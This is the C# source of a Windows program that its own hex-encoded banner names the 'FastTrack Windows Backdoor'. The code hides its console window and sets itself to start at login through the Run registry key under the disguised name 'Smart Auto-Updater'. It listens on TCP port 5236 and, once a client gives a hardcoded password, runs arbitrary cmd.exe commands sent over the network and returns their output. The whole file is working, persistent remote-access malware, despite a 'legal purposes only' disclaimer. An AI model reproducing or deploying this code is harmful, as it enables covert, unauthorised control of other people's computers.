using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Text.Unicode;
using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using static System.Net.Mime.MediaTypeNames;

namespace FastTrack
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;

        static async Task Main(string[] args)
        {
            // Hide the console
            IntPtr hWnd = GetConsoleWindow();
            FreeConsole();
            ShowWindow(hWnd, SW_HIDE);

            // Simple Persistence (create a scheduled task)
            Microsoft.Win32.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Smart Auto-Updater", Environment.ProcessPath!);


            // Bind port for the backdoor service
            int port = 5236;

            // Start Listener
            TcpListener listener = new TcpListener(IPAddress.Any, port);
            listener.Start();

            Console.WriteLine("[*] Listening on 0.0.0.0:" + port);

            // Client handler per-connection.
            while (true)
            {
                TcpClient client = await listener.AcceptTcpClientAsync();

                _ = HandleClient(client);
            }
        }

        static async Task HandleClient(TcpClient client)
        {
            // Handle client connection
            string remoteEndpoint = client.Client.RemoteEndPoint.ToString();
            Console.WriteLine("[+] Client CONNECTED: " + remoteEndpoint);

            // Client authentication: Prevent usage by every connected client.
            byte[] _password = { 0x56, 0x78, 0x42, 0x43, 0x37, 0x38, 0x33, 0x76, 0x21, 0x6f, 0x6d, 0x45, 0x6b, 0x32, 0x5a, 0x23, 0x70, 0x51 }; // VxBC783v!omEk2Z#pQ
            bool _authenticated = false;

            // Initialize the current working directory.
            string PWD = Environment.CurrentDirectory;

            // Interactive access starts from here.
            try
            {
                using (client)
                using (var stream = client.GetStream())
                {

                    byte[] buffer = new byte[4096];

                    while (true)
                    {
                        int read;
                        try
                        {
                            read = await stream.ReadAsync(buffer, 0, buffer.Length);
                        }
                        catch
                        {
                            // connection reset / aborted
                            break;
                        }

                        if (read == 0)
                            break; // client closed connection

                        string msg = Encoding.UTF8.GetString(buffer, 0, read);




                        // Authentication Block
                        if(!_authenticated)
                        {
                            if (buffer.Take(read).Reverse().SkipWhile(b => b is 0x0A or 0x0D or 0x20 or 0x09).Reverse().SequenceEqual(_password))
                            {
                                Console.WriteLine("[+] Client authenticated.");
                                _authenticated = true;

                                byte[] banner = { 0x0a, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x0a, 0x23, 0x23, 0x20, 0x20, 0x2d, 0x3e, 0x5d, 0x20, 0x46, 0x61, 0x73, 0x74, 0x54, 0x72, 0x61, 0x63, 0x6b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x42, 0x61, 0x63, 0x6b, 0x64, 0x6f, 0x6f, 0x72, 0x20, 0x20, 0x23, 0x23, 0x0a, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x0a, 0x0a, 0x46, 0x61, 0x73, 0x74, 0x54, 0x72, 0x61, 0x63, 0x6b, 0x20, 0x76, 0x31, 0x2e, 0x30, 0x20, 0x28, 0x43, 0x29, 0x20, 0x32, 0x30, 0x32, 0x35, 0x20, 0x62, 0x79, 0x20, 0x4c, 0x75, 0x69, 0x67, 0x69, 0x20, 0x46, 0x69, 0x6f, 0x72, 0x65, 0x20, 0x28, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x6c, 0x79, 0x70, 0x64, 0x30, 0x2e, 0x63, 0x6f, 0x6d, 0x29, 0x2e, 0x0a, 0x42, 0x75, 0x69, 0x6c, 0x74, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x6c, 0x65, 0x67, 0x61, 0x6c, 0x20, 0x70, 0x75, 0x72, 0x70, 0x6f, 0x73, 0x65, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x73, 0x20, 0x6f, 0x6e, 0x6c, 0x79, 0x2e, 0x0a };
                                stream.WriteAsync(banner, 0, banner.Length);
                            }
                            else
                            {
                                Console.WriteLine("[-] Client failed authentication.");
                                break;
                            }
                        }

                        if (msg.StartsWith("cd "))
                        {
                            string arg = msg.Substring(3).Trim();

                            if (arg == "..")
                                PWD = Directory.GetParent(PWD)!.FullName;
                            else
                                PWD = Path.GetFullPath(Path.Combine(PWD, arg));

                            // Returing the response to the poor soul (yay we changed directory)
                            await stream.WriteAsync(Encoding.UTF8.GetBytes($"\n->] {PWD}> "));
                            continue; // No command to execute here.
                        }

                        var psi = new ProcessStartInfo("cmd.exe", $"/c {msg}")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WorkingDirectory = $"{PWD}"
                        };

                        using var proc = Process.Start(psi)!;
                        string output = await proc.StandardOutput.ReadToEndAsync();
                        await proc.WaitForExitAsync();

                        byte[] response = Encoding.UTF8.GetBytes(output + $"\n->] {PWD}> ");
                        await stream.WriteAsync(response, 0, response.Length);

                    }
                }
            }
            finally
            {
                Console.WriteLine("[-] Client DISCONNECTED: " + remoteEndpoint);
            }
        }


    }
}
